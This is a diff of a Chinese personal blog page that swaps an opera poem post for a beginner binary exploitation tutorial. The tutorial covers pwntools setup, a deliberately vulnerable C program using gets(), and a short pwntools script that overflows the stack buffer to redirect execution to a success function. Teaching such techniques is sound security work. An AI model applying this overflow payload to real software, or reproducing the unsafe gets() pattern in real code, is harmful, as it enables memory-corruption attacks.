@@ -3,20 +3,19 @@
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
-  <title>定场诗 | ssj的博客</title>
+  <title>pwn 入门——溢出 | ssj的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="天为罗盖地为毯，日月星辰伴我眠。什么人撒下名利网，富贵贫困不一般。也有骑马与坐轿，也有推车把担担。骑马坐轿修来的福，推车担担命该然。骏马驮着痴呆汉，美妇人常伴拙夫眠。八十老翁门前站，三岁顽童染黄泉。不是老天不长眼，天理昭彰这报应循环。">
-<meta name="keywords" content="定场诗">
+  <meta name="description" content="环境搭建我用的是 windows 的 ubuntu。 安装 pwntoolspip install pwntools 64 位 windows 支持 32 位 linux 程序,安装 qemu &amp;amp; binfmt1234sudo apt updatesudo apt install qemu-user-staticsudo update-binfmts --install i386 /usr">
 <meta property="og:type" content="article">
-<meta property="og:title" content="定场诗">
-<meta property="og:url" content="https://github.com/Cracke-S-J/2019/03/08/start-poem/index.html">
+<meta property="og:title" content="pwn 入门——溢出">
+<meta property="og:url" content="https://github.com/Cracke-S-J/2019/07/21/pwn1/index.html">
 <meta property="og:site_name" content="ssj的博客">
-<meta property="og:description" content="天为罗盖地为毯，日月星辰伴我眠。什么人撒下名利网，富贵贫困不一般。也有骑马与坐轿，也有推车把担担。骑马坐轿修来的福，推车担担命该然。骏马驮着痴呆汉，美妇人常伴拙夫眠。八十老翁门前站，三岁顽童染黄泉。不是老天不长眼，天理昭彰这报应循环。">
+<meta property="og:description" content="环境搭建我用的是 windows 的 ubuntu。 安装 pwntoolspip install pwntools 64 位 windows 支持 32 位 linux 程序,安装 qemu &amp;amp; binfmt1234sudo apt updatesudo apt install qemu-user-staticsudo update-binfmts --install i386 /usr">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-07-09T08:40:26.990Z">
+<meta property="og:updated_time" content="2019-07-25T13:25:03.849Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="定场诗">
-<meta name="twitter:description" content="天为罗盖地为毯，日月星辰伴我眠。什么人撒下名利网，富贵贫困不一般。也有骑马与坐轿，也有推车把担担。骑马坐轿修来的福，推车担担命该然。骏马驮着痴呆汉，美妇人常伴拙夫眠。八十老翁门前站，三岁顽童染黄泉。不是老天不长眼，天理昭彰这报应循环。">
+<meta name="twitter:title" content="pwn 入门——溢出">
+<meta name="twitter:description" content="环境搭建我用的是 windows 的 ubuntu。 安装 pwntoolspip install pwntools 64 位 windows 支持 32 位 linux 程序,安装 qemu &amp;amp; binfmt1234sudo apt updatesudo apt install qemu-user-staticsudo update-binfmts --install i386 /usr">
   
     <link rel="alternative" href="/atom.xml" title="ssj的博客" type="application/atom+xml">
   
@@ -214,11 +213,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-start-poem" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-pwn1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/08/start-poem/" class="article-date">
-      <time datetime="2019-03-08T11:10:30.000Z" itemprop="datePublished">2019-03-08</time>
+      <a href="/2019/07/21/pwn1/" class="article-date">
+      <time datetime="2019-07-20T17:21:05.000Z" itemprop="datePublished">2019-07-21</time>
 </a>
     </div>
   
@@ -231,7 +230,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      定场诗
+      pwn 入门——溢出
     </h1>
   
 
@@ -239,16 +238,8 @@
       
       <div class="article-info article-info-post">
         
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/opera/">听戏</a>
-    </div>
-
 
         
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/定场诗/">定场诗</a></li></ul>
-    </div>
-
         <div class="clearfix"></div>
       </div>
       
@@ -256,8 +247,12 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <center>天为罗盖地为毯，日月星辰伴我眠。</center><br><center>什么人撒下名利网，富贵贫困不一般。</center><br><center>也有骑马与坐轿，也有推车把担担。</center><br><center>骑马坐轿修来的福，推车担担命该然。</center><br><center>骏马驮着痴呆汉，美妇人常伴拙夫眠。</center><br><center>八十老翁门前站，三岁顽童染黄泉。</center><br><center>不是老天不长眼，天理昭彰这报应循环。</center>
-
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我用的是 windows 的 ubuntu。</p>
+<h3 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h3><p><code>pip install pwntools</code></p>
+<h3 id="64-位-windows-支持-32-位-linux-程序-安装-qemu-amp-binfmt"><a href="#64-位-windows-支持-32-位-linux-程序-安装-qemu-amp-binfmt" class="headerlink" title="64 位 windows 支持 32 位 linux 程序,安装 qemu &amp; binfmt"></a>64 位 windows 支持 32 位 linux 程序,安装 qemu &amp; binfmt</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu-user-static</span><br><span class="line">sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic '\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00' --mask '\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff'</span><br><span class="line">service binfmt-support start</span><br></pre></td></tr></table></figure>
+<h3 id="关-pie，编译时加-no-pie"><a href="#关-pie，编译时加-no-pie" class="headerlink" title="关 pie，编译时加 -no-pie"></a>关 pie，编译时加 -no-pie</h3><h2 id="0x00-stack-example"><a href="#0x00-stack-example" class="headerlink" title="0x00 stack_example"></a>0x00 stack_example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## coding = utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="0x01-ret2text"><a href="#0x01-ret2text" class="headerlink" title="0x01 ret2text"></a>0x01 ret2text</h2>
       
       
         <div class="page-reward">
@@ -312,13 +307,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/08/start-poem/">定场诗</a></p>
+        <p><span>本文标题:</span><a href="/2019/07/21/pwn1/">pwn 入门——溢出</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 ssj 的个人博客">ssj</a></p>
-        <p><span>发布时间:</span>2019年03月08日 - 19时10分</p>
-        <p><span>最后更新:</span>2019年07月09日 - 16时40分</p>
+        <p><span>发布时间:</span>2019年07月21日 - 01时21分</p>
+        <p><span>最后更新:</span>2019年07月25日 - 21时25分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/08/start-poem/" title="定场诗">https://github.com/Cracke-S-J/2019/03/08/start-poem/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://github.com/Cracke-S-J/2019/03/08/start-poem/　　作者: ssj" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/07/21/pwn1/" title="pwn 入门——溢出">https://github.com/Cracke-S-J/2019/07/21/pwn1/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://github.com/Cracke-S-J/2019/07/21/pwn1/　　作者: ssj" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -331,15 +326,20 @@
 
 <nav id="article-nav">
   
-    <a href="/2019/03/13/Ethereum-background/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/07/25/zhulianzhai/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          以太坊背景知识
+          珠帘寨
         
       </div>
     </a>
   
+  
+    <a href="/2019/07/08/ndk/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Android Studio NDK 开发环境搭建</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
   
 </nav>
 
@@ -348,7 +348,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装-pwntools"><span class="toc-number">1.1.</span> <span class="toc-text">安装 pwntools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64-位-windows-支持-32-位-linux-程序-安装-qemu-amp-binfmt"><span class="toc-number">1.2.</span> <span class="toc-text">64 位 windows 支持 32 位 linux 程序,安装 qemu &amp; binfmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关-pie，编译时加-no-pie"><span class="toc-number">1.3.</span> <span class="toc-text">关 pie，编译时加 -no-pie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-stack-example"><span class="toc-number">2.</span> <span class="toc-text">0x00 stack_example</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ret2text"><span class="toc-number">3.</span> <span class="toc-text">0x01 ret2text</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
 
@@ -414,13 +414,15 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/13/Ethereum-background/" title="上一篇: 以太坊背景知识">
+            <a href="/2019/07/25/zhulianzhai/" title="上一篇: 珠帘寨">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2019/07/08/ndk/" title="下一篇: Android Studio NDK 开发环境搭建">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
     </div>
     <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/07/25/zhulianzhai/">珠帘寨</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/pwn1/">pwn 入门——溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/08/ndk/">Android Studio NDK 开发环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/27/vest-car-king/">给车王二手车套马甲</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/27/android-inject-code/">Android静态注入常用代码</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/24/kill-chenshimei/">铡美案</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/20/easy-android-unpack/">Android脱壳入门</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/18/cpp-object/">《深度探索Cpp对象模型》学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/06/yangsilang-visit-his-mother/">四郎探母(看url:yangsilang-visit-his-mother)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/31/songshijie/">四进士(又名宋士杰)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/29/resume/">简历</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/29/CTF-android/">小菜比ssj吹头发记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/17/ssj-android-shell-0th/">小菜比ssj写了一个壳子</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/iSmart-break-sign/">iSmart逆向分析之绕过签名验证</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/25/Ethereum-practice/">ethernaut-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/18/Ethereum-bug/">以太坊漏洞 TOP9</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/Ethereum-background/">以太坊背景知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/08/start-poem/">定场诗</a></li></ul>
